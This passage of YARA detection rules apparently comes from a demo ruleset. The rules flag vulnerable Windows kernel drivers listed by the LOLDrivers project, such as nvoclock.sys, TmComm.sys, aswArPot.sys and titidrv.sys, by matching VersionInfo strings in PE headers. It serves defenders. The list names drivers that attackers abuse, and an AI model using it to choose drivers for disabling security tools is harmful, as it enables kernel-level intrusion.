\"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:12:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00300035002e00300039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00300035002e00300039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_2AFD_RID3DC9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:09:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00370030002e0030002e0031003000390038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_00D9_RID3439 : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:21:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100340020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrwinddkprovider_Dcprotectsys_Dcprotectrwinxdriver_C35C_RID458C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - DcProtect.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 03:40:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0044006300500072006f00740065006300740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000570069006e00200037002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0032002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0044006300500072006f00740065006300740020002800520029002000570069006e003800780038003600200064007200690076006500720020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0044006300500072006f0074006500630074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032002d00320030003200300020004a00690061006e0067006d0065006e0020004500790075006e0020004e006500740077006f0072006b00200043006f002e002c004c00740064002e00200032003000310039 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Iomapsys_Asuskernelmodedriverfornt_EA85_RID442A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - IOMap64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 02:41:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410053005500530020004b00650072006e0065006c0020004d006f00640065002000440072006900760065007200200066006f00720020004e00540020 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0049004f004d00610070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410053005500530020004b00650072006e0065006c0020004d006f00640065002000440072006900760065007200200066006f00720020004e00540020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0049004f004d00610070002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000320030003100300020004100530055005300540065004b00200043006f006d0070007500740065007200200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_E05E_RID3D1D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:40:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000370032002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000370032002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100330020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_E452_RID4669 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:17:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0032002e0033003800320037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0032002e0033003800320037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Marvintestsolutionsinc_Hwsys_Hw_5596_RID3AEF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - hw.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:07:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570020002d002000570069006e0064006f007700730020004e0054002d003100300020002800330032002f00360034002000620069007400290020006b00650072006e0065006c0020006d006f00640065002000640072006900760065007200200066006f007200200050004300200070006f007200740073002f006d0065006d006f00720079002f0050004300490020006100630063006500730073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0061007200760069006e0020005400650073007400200053006f006c007500740069006f006e0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0034002e0039002e0038002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0034002e0039002e0038002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00480077002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00480057 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00480057002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200031003900390036002d00320030003200310020004d0061007200760069006e0020005400650073007400200053006f006c007500740069006f006e0073002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Getactechnologycorporation_Mtcbsvsys_Getacsystemserviceprovider_E602_RID4842 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - GtcKmdfBs.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:36:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320031002c00200032002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006d0074006300420053007600360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00470065007400610063002000530079007300740065006d00200053006500720076006900630065002000500072006f00760069006400650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004700740063004b006d0064006600420073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300031003900200047006500740061006300200054006500630068006e006f006c006f0067007900200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Genitlkiwibenjaminxxxxx_Titidrv_Titidrvtiticatz_208E_RID41AC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - titidrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:55:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]007400690074006900640072007600200066006f0072002000570069006e0064006f00770073002000280074006900740069006300610074007a0029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00670065006e00690074006c006b0069007700690020002800420065006e006a0061006d0069006e0020005800580058005800580029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0074006900740069006400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0074006900740069006400720076002000280074006900740069006300610074007a0029 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0074006900740069006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d00200032003000310037002000670065006e00690074006c006b0069007700690020002800420065006e006a0061006d0069006e0020005800580058005800580029 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Advancedmicrodevicesinc_Pdfwkrnlsys_Usbcpowerdeliveryfirmwareupdateutilitydriver_5DF6_RID4F69 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PDFWKRNL.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 08:52:09\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d007700610072006500200055007000640061007400650020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005500530042002d004300200050006f007700650072002000440065006c006900760065007200790020004600690072006d007700610072006500200055007000640061007400650020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0050004400460057004b0052004e004c002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020003200300032003300200041006400760061006e0063006500640020004d006900630072006f00200044006500760069006300650073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_B9AD_RID3BD5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:46:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f007700730020004e0054002f0032003000300030002f0058005000200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200033002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003900200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_348D_RID343F : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:22:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310031002e0031003100320039 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310031002e0031003100320039 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]003300360030786c4ef659275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100310020003300360030002e0063006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Mydriverscom_Hwm_Drivergenius_08EB_RID39F8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mydrivers.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:26:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00440072006900760065007200470065006e0069007500730020004800610072006400770061007200650020006d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00790044007200690076006500720073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e0032002e003700300037002e0031003200310034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032003000310036002e0037002e0037002e0031003200310034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00480057004d } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00440072006900760065007200470065006e006900750073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006d00790064007200690076006500720073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020004d00790044007200690076006500720073002e0063006f006d00200061006c006c002000720069006700680074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sisoftware_Sandra_Sisoftwaresandra_3E27_RID3BE3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SANDRA.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:48:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530061006e006400720061002000440065007600690063006500200044007200690076006500720020002800570069006e003600340020007800360034002900280055006e00690063006f006400650029 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005300690053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0037002e0031002e00310020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0037002e0031002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005300690053006f006600740077006100720065002000530061006e006400720061 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00530041004e004400520041 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a90020005300690053006f0066007400770061007200650020004c0074006400200031003900390035002d0032003000300037002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Evgatechnologyinc_Windowsvistasmartiodevice_Windowsvistasmartiodevice_3C95_RID4AC1 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - SMARTEIO64.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 07:22:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570069006e0064006f007700730020005600690073007400610036003400200053006d00610072007400200049004f0020004400650076006900630065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004500560047004100200054006500630068006e006f006c006f0067007900200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00310033002e00300031002e0032003000300038002d0031002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00310033002e00300031002e0032003000300038002d0031002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00570069006e0064006f007700730020005600690073007400610036003400200053006d00610072007400200049004f0020004400650076006900630065 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020005600690073007400610036003400200053006d00610072007400200049004f0020004400650076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0053004d00410052005400450049004f00360034002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002800630029002000320030003000370020004500560047004100200054006500630068006e006f006c006f0067007900200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_033C_RID3BAE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:39:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200031002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003800200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and 